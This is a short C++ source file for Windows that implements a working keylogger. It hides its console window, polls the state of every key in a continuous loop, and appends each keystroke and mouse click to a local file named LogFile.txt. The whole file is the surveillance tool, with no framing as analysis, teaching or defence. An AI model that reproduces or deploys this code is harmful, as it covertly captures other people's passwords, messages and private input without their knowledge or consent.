#include <Windows.h>
#include <winuser.h>
#include <fstream>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <stdio.h>
using namespace std;
#define skinjbir true
#define walczy false
void LOG(string text){
  fstream log;
  log.open("LogFile.txt",std::fstream::app);
  if(!log.is_open()){
    cerr << "an error detected : the file already opened by another process.\n[+] try to kill the process\n";
    exit(-1);
  }
  else{
    log << text;
    log.close();
  }
}
bool SpecialKeys(int S){
  switch(S){
    case VK_BACK:
    cout << "\b";
    LOG("\b");
    return skinjbir;
    case VK_TAB:
    cout << "\t";
    LOG("\t");
    return skinjbir;
    case VK_RETURN:
    cout << "\n";
    LOG("\n");
    return skinjbir;
    case VK_LBUTTON:
    cout << " #Left Click# ";
    LOG(" #Left Click# ");
    return skinjbir;
    case VK_RBUTTON:
    cout << " #Right Click# ";
    LOG(" #Right Click# ");
    return skinjbir;
    case VK_SHIFT:
    cout << " #Shift# ";
    LOG(" #Shift# ");
    return skinjbir;
    case VK_CONTROL:
    cout << " #Ctrl# ";
    LOG(" #Ctrl# ");
    return skinjbir;
    case VK_MENU:
    cout << " #ALT# ";
    LOG(" #ALT# ");
    return skinjbir;
    case '%':
    cout << ".";
    LOG(".");
    return skinjbir;
    case VK_CAPITAL:
    cout << " #CAPS LOCK# ";
    LOG(" #CAPS LOCK# ");
    return skinjbir;
    case VK_SPACE:
    cout << " ";
    LOG(" ");
    return skinjbir;
    //case VK_LEFT:
    //cout << "#Left Arrow#";
    //LOG("#Left Arrow#");
    //return skinjbir;
    case VK_UP:
    cout << " #Up Arrow# ";
    LOG(" #Up Arrow# ");
    return skinjbir;
    case VK_RIGHT:
    cout << " #Right Arrow# ";
    LOG(" #Right Arrow# ");
    return skinjbir;
    case VK_DOWN:
    cout << " #Down Arrow# ";
    LOG(" #Down Arrow# ");
    return skinjbir;
    case VK_DELETE:
    cout << " #Delete# ";
    LOG(" #Delete# ");
    return skinjbir;
    default:
    return walczy;
  }
}
int main(void){
  //ShowWindow(HWND hWnd, int nCmdShow);
  ShowWindow(GetConsoleWindow(), SW_HIDE);
  char key='x';
  while(skinjbir){
    Sleep(10);
    for(int key=8;key<=190;key++){
      if(GetAsyncKeyState(key) == -32767){
        if(SpecialKeys(key) == walczy){
          cout << key;
          fstream log;
          log.open("LogFile.txt", std::fstream::app);
          if(log.is_open()){
              log << char(key);
              log.close();
          }
          }
        }
      }
    }
  return 0;
}
// aka walczy
